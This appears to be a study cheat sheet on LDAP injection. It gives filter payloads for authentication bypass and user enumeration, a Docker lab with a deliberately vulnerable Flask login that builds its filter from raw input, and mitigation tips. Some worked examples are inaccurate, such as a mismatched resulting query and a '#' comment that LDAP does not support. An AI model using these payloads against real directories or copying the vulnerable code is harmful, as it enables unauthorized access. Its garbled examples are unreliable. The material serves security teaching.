#  **LDAP Injection**

LDAP Injection happens when user input is embedded directly into an LDAP query without proper sanitization. It allows an attacker to manipulate LDAP filters and bypass authentication, enumerate users, or extract sensitive directory information.

---

#  **1. How LDAP Queries Normally Look**

Example authentication filter:

```
(&(uid=HARSH)(password=12345))
```

This checks for an entry where:

* uid = HARSH
* password = 12345

If raw input is used directly:

```java
String filter = "(&(uid=" + user + ")(password=" + pass + "))";
```

→ This becomes injectable.

---

#  **2. LDAP Injection — What Attackers Do**

If the application does not escape LDAP filter characters (`*`, `)`, `(`, `|`, `&`, `\`), attackers can append additional filters or bypass checks.

---

#  **3. Common LDAP Injection Payloads**

###  **Bypass Authentication**

#### **Payload 1 — OR Always True**

```
*)(uid=*)
```

Injected username:

```
*)(uid=*))(|(uid=*
```

Final query becomes:

```
(&(uid=*)(uid=*))(password=anything))
```

→ Always TRUE → logs in without credentials.

---

###  **Payload 2 — Full Bypass**

Username:

```
*)(|(uid=*))
```

Query becomes:

```
(&(uid=*)(|(uid=*))(password=abc))
```

→ Always TRUE.

---

###  **Payload 3 — Blind LDAP Injection**

Use time-based or boolean-based responses:

```
*)(cn=admin))#
```

---

# ❗ **4. Enumeration via LDAP Injection**

### **Find Valid Users**

```
*)(uid=harsh*)
```

### **Dump All Users**

```
*)(uid=*)
```

### **Extract Groups**

```
*)(objectClass=group)
```

---

#  **5. LDAP Injection Lab Setup (Docker)**

You can run this locally.

---

## ** Step 1: Vulnerable Web App**

**Dockerfile for LDAP-vulnerable app (Python/Flask + LDAP)**

```dockerfile
FROM python:3.10-slim

RUN pip install flask python-ldap

COPY app.py /app/app.py
WORKDIR /app

CMD ["python", "app.py"]
```

---

### **app.py (Vulnerable)**

```python
from flask import Flask, request
import ldap

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("user")
    pwd = request.form.get("pass")

    filter = f"(&(uid={user})(userPassword={pwd}))"  # Vulnerable
    conn = ldap.initialize("ldap://openldap:389")

    try:
        result = conn.search_s("dc=test,dc=local", ldap.SCOPE_SUBTREE, filter)
        if result:
            return "Login successful!"
        else:
            return "Invalid credentials"
    except Exception as e:
        return str(e)

app.run(host="0.0.0.0", port=5000)
```

---

## ** Step 2: OpenLDAP Docker**

`docker-compose.yml`:

```yaml
version: '3'

services:
  openldap:
    image: osixia/openldap:latest
    environment:
      - LDAP_ORGANISATION=Test
      - LDAP_DOMAIN=test.local
      - LDAP_ADMIN_PASSWORD=admin
    ports:
      - "389:389"

  ldap-admin:
    image: osixia/phpldapadmin:latest
    environment:
      PHPLDAPADMIN_LDAP_HOSTS: openldap
    ports:
      - "8080:80"

  vulnerable:
    build: .
    ports:
      - "5000:5000"
    depends_on:
      - openldap
```

This gives you:

* Login Form → Port 5000
* LDAP Admin GUI → Port 8080
* LDAP Server → Port 389

Perfect for practice.

---

#  **6. How to Test LDAP Injection**

### Using Burp Suite:

Try:

```
user=*)(uid=*)
pass=anything
```

Or fuzz with:

```
*)
(|(uid=*))
(userPassword=*)
(&(objectClass=*)
```

---

# **7. How to Mitigate LDAP Injection**

### ✔ Escape LDAP special characters:

`(` `)` `*` `\` `NUL`

### ✔ Use prepared LDAP queries (safe APIs):

* Python: `ldap.filter.escape_filter_chars()`
* Java: `DirContext.bind()`, `SearchControls`

### ✔ Apply input validation:

* Allow only alphanumerics for username.

---

